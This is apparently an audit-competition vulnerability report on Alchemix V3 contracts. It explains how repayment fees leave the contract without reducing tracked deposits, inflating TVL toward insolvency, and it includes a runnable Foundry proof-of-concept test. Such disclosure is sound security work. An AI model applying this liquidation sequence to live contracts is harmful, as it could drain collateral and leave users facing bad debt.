# 58395 sc high repayment fee exit leaves mytsharesdeposited inflated hiding protocol insolvency

**Submitted on Nov 1st 2025 at 22:12:55 UTC by @Codexstar for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58395
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Protocol insolvency

## Description

### Brief / Intro

`AlchemistV3._resolveRepaymentFee` deducts the repayment fee from a borrower’s collateral and pays it to the liquidator, but `_mytSharesDeposited` is never decremented. In the liquidation branch that only repays earmarked debt, the fee leaves the contract while system TVL still counts it. Repeating this drains real collateral and lets the protocol burn alAssets against phantom backing until it becomes insolvent.

### Vulnerability Details

* When `_liquidate` only needs to clear earmarked debt, it executes:

  ```solidity
  repaidAmountInYield = _forceRepay(accountId, account.earmarked);
  if (account.debt == 0) {
      feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
      TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
      return (repaidAmountInYield, feeInYield, 0);
  }
  ```

  `src/AlchemistV3.sol:819-828`
* `_resolveRepaymentFee` removes the fee from the borrower’s collateral balance but leaves global accounting untouched:

  ```solidity
  fee = repaidAmountInYield * repaymentFee / BPS;
  account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee;
  ```

  `src/AlchemistV3.sol:900-905`
* Immediately after, `_liquidate` transfers the fee out of the contract (`src/AlchemistV3.sol:825-826`). `_mytSharesDeposited` is never reduced, so `_getTotalUnderlyingValue()` (`src/AlchemistV3.sol:1236-1241`) still includes the missing amount. Transmuter bad-debt scaling (`src/Transmuter.sol:215-226`) and collateralization checks now rely on phantom collateral.

### Impact Details

* Each liquidation that repays earmarked debt overstates `_mytSharesDeposited` by `repaidAmountInYield * repaymentFee / BPS`.
* The protocol keeps redeeming alAssets and issuing new debt against nonexistent backing, leading to permanent bad debt.
* With any non-zero `repaymentFee`, an attacker can farm this branch, extract fees, and quietly erode actual collateral until insolvency.

### References

* Earmarked-only liquidation flow: `src/AlchemistV3.sol:819-828`
* Repayment fee deduction: `src/AlchemistV3.sol:900-905`
* Fee transfer to liquidator: `src/AlchemistV3.sol:825-826`
* TVL calculation from `_mytSharesDeposited`: `src/AlchemistV3.sol:1236-1241`
* Bad-debt ratio using inflated denominator: `src/Transmuter.sol:215-226`

## Proof of Concept

1. Set `repaymentFee` to a positive value (e.g., 5%) and keep protocol fee at 0 to isolate the effect.
2. Borrower deposits MYT, mints debt; another user creates a transmuter redemption to earmark half the debt.
3. After maturity, liquidator calls `alchemist.liquidate(tokenId)`. `_forceRepay` clears the debt and `_resolveRepaymentFee` pays the fee; `_liquidate` returns early.
4. Compare `alchemist.getTotalUnderlyingValue()` with `convertYieldTokensToUnderlying(IERC20(vault).balanceOf(address(alchemist)))`: the difference equals the repayment fee, proving `_mytSharesDeposited` still counts the exited funds.

### Runnable Foundry Test

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {AlchemistV3Test} from "../AlchemistV3.t.sol";
import {AlchemistNFTHelper} from "../libraries/AlchemistNFTHelper.sol";
import {IMockYieldToken} from "../mocks/MockYieldToken.sol";
import {SafeERC20} from "../../libraries/SafeERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract RepaymentFeeAccountingPoC is AlchemistV3Test {
    using SafeERC20 for IERC20;

    function test_poc_repayment_fee_leaves_tracked_tvl_inflated() external {
        vm.startPrank(alOwner);
        alchemist.setProtocolFee(0);
        alchemist.setRepaymentFee(500); // 5%
        vm.stopPrank();

        uint256 amount = 100e18;
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), amount);
        alchemist.deposit(amount, address(0xbeef), 0);
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        alchemist.mint(tokenId, amount / 2, address(0xbeef));
        vm.stopPrank();

        vm.prank(alOwner);
        IMockYieldToken(mockStrategyYieldToken).siphon(20e18);

        vm.prank(alOwner);
        transmuterLogic.setTransmutationTime(1);

        vm.startPrank(address(0xdad));
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), 50e18);
        transmuterLogic.createRedemption(50e18);
        vm.stopPrank();

        vm.roll(block.number + 2);

        vm.startPrank(externalUser);
        uint256 trackedBefore = alchemist.getTotalUnderlyingValue();
        uint256 actualBefore = alchemist.convertYieldTokensToUnderlying(IERC20(address(vault)).balanceOf(address(alchemist)));
        (uint256 repaidAmountInYield, uint256 feeInYield,) = alchemist.liquidate(tokenId);
        uint256 trackedAfter = alchemist.getTotalUnderlyingValue();
        uint256 actualAfter = alchemist.convertYieldTokensToUnderlying(IERC20(address(vault)).balanceOf(address(alchemist)));
        vm.stopPrank();

        uint256 repaidUnderlying = alchemist.convertYieldTokensToUnderlying(repaidAmountInYield);
        uint256 feeUnderlying = alchemist.convertYieldTokensToUnderlying(feeInYield);
        uint256 delta = (trackedAfter - actualAfter) - (trackedBefore - actualBefore);

        assertEq(delta, repaidUnderlying + feeUnderlying, "Tracked TVL ignores outflows");
        assertEq(delta - repaidUnderlying, feeUnderlying, "Repayment fee alone inflates TVL");
    }
}
```

Run with:

```bash
forge test --match-test test_poc_repayment_fee_leaves_tracked_tvl_inflated -vv
```
